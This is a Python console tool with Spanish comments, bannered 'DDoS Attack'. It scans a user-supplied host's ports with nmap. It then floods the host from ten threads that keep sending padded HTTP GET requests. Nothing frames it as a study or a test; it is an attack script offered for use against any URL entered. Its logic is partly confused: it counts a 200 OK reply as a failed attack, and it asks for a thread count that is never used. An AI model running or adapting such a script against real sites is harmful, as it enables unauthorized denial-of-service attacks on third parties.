import os
import socket
import urllib.parse
import urllib.error
import threading
import nmap

from colorama import *

def scan_open_ports(url):
    """Función para escanear los puertos abiertos de la URL."""
    try:
        parsed_url = urllib.parse.urlparse(url)
        host = parsed_url.hostname

        nm = nmap.PortScanner()
        nm.scan(host)
        open_ports = []
        for host in nm.all_hosts():
            for proto in nm[host].all_protocols():
                lport = nm[host][proto].keys()
                for port in lport:
                    if nm[host][proto][port]['state'] == 'open':
                        open_ports.append(port)
        return open_ports
    except Exception as e:
        print(f"Error al escanear puertos abiertos: {e}")
        return []

def send_attack(host, port, requestData, success_flag):
    """Función para enviar una solicitud de ataque DDoS a un host y puerto."""
    try:
        while not success_flag.is_set():  # Continuar atacando hasta que la bandera de éxito esté establecida
            with socket.create_connection((host, port), timeout=5) as s:
                request = f"GET / HTTP/1.1\r\nHost: {host}\r\n\r\n"
                payload = request.encode() + requestData
                s.sendall(payload)
                response = s.recv(1024)  # Recibimos la respuesta de la solicitud
                if b"200 OK" in response:  # Si la respuesta contiene "200 OK", consideramos que el ataque fue denegado
                    success_flag.set()  # Establecemos la bandera de éxito
    except (socket.error, socket.timeout) as e:
        pass  # Ignoramos los errores de conexión

def ddos_attack(url):
    """Función para realizar un ataque DDoS."""
    try:
        open_ports = scan_open_ports(url)
        if open_ports:
            print("Puertos abiertos:", open_ports)
        else:
            print(Fore.BLACK + Back.RED + "No se encontraron puertos abiertos.")

        parsed_url = urllib.parse.urlparse(url)
        host = parsed_url.hostname
        port = parsed_url.port

        if host is None:
            print(Fore.BLACK + Back.RED + "URL inválida. Por favor, ingresa una URL válida.")
            return

        if port is None:
            port = 443 if parsed_url.scheme == "https" else 80

        inet_address = socket.gethostbyname(host)
        requestData = b"X" * 1024

        success_flag = threading.Event()  # Creamos una bandera de éxito
        threads = []
        for _ in range(10):  # Podemos definir un número máximo de hilos para el ataque
            t = threading.Thread(target=send_attack, args=(host, port, requestData, success_flag))
            threads.append(t)
            t.start()

        for t in threads:
            t.join()

        if success_flag.is_set():  # Si la bandera de éxito está establecida, significa que el ataque fue denegado
            print(Fore.BLACK + Back.RED + "ATAQUE DENEGADO")
            print(Style.RESET_ALL +"")
        else:
            print(Fore.BLACK + Back.LIGHTGREEN_EX +" ATAQUE EXITOSO ")
            print(Style.RESET_ALL +"")

    except urllib.error.URLError as e:
        print(Fore.BLACK + Back.RED + "URL inválida:", url)
        print(e)
    except (socket.error, ValueError, KeyboardInterrupt) as e:
        print(Fore.BLACK + Back.RED + f"Ocurrió un error: {e}")

def ddos_attack_main():
    """Función principal para iniciar el ataque DDoS."""

    clear_screen()
    banner()

    while True:
        respuesta = input(Style.RESET_ALL + "¿Desea realizar un ataque DDoS? (s/n): ")
        if respuesta.lower() in ["s", "n"]:
            break
        else:
            clear_screen()  # Limpiar la pantalla antes de volver a solicitar la entrada
            banner()
            print(Fore.BLACK + Back.RED + "Por favor, inserta un comando válido.")

    if respuesta.lower() == "s":
        while True:
            clear_screen()
            banner()
            url = input(Style.RESET_ALL + "Ingresa la URL completa del host: ")
            if not url.strip():  # Verificar si la entrada está vacía
                clear_screen()  # Limpiar la pantalla antes de mostrar el mensaje de error
                banner()
                print(Fore.BLACK + Back.RED + "Inserte datos válidos.")
                continue
            try:
                parsed_url = urllib.parse.urlparse(url)  # Intenta analizar la URL
                if not parsed_url.scheme or not parsed_url.hostname:
                    raise ValueError
                ddos_attack(url)  # Realiza el ataque si la URL es válida
                break  # Sale del bucle si el ataque se realizó con éxito
            except ValueError:
                clear_screen()  # Limpiar la pantalla antes de mostrar el mensaje de error
                banner()
                print(Fore.BLACK + Back.RED + "URL inválida. Por favor, ingresa una URL válida.")
                input(Style.RESET_ALL + "Presiona Enter para continuar...")
                continue  # Vuelve a solicitar la URL si es inválida

        while True:
            clear_screen()
            banner()
            num_threads_input = input(Style.RESET_ALL + "Ingrese el número de hilos para el ataque DDoS: ")
            try:
                num_threads = int(num_threads_input)
                break  # Sale del bucle si el número de hilos es válido
            except ValueError:
                clear_screen()  # Limpiar la pantalla antes de mostrar el mensaje de error
                banner()
                print("Por favor, ingresa un número entero válido para el número de hilos.")
                input(Style.RESET_ALL + "Presiona Enter para continuar...")
                continue  # Vuelve a solicitar el número de hilos si no es válido

    elif respuesta.lower() == "n":
        
        try:
            input("Presiona Enter para salir...")
        except KeyboardInterrupt:
            print(Fore.BLACK + Back.RED + "\nAtaque DDoS interrumpido.")



def banner():
    cartel = r"""
    ___  ___      ___     _  _   _           _   
   |   \|   \ ___/ __|   /_\| |_| |_ __ _ __| |__
   | |) | |) / _ \__ \  / _ \  _|  _/ _` / _| / /
   |___/|___/\___/___/ /_/ \_\__|\__\__,_\__|_\_\                                            
                                             
    """
    clear_screen()
    print(Fore.GREEN + cartel)
    print("**************************************************")

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

if __name__ == "__main__":
    ddos_attack_main()
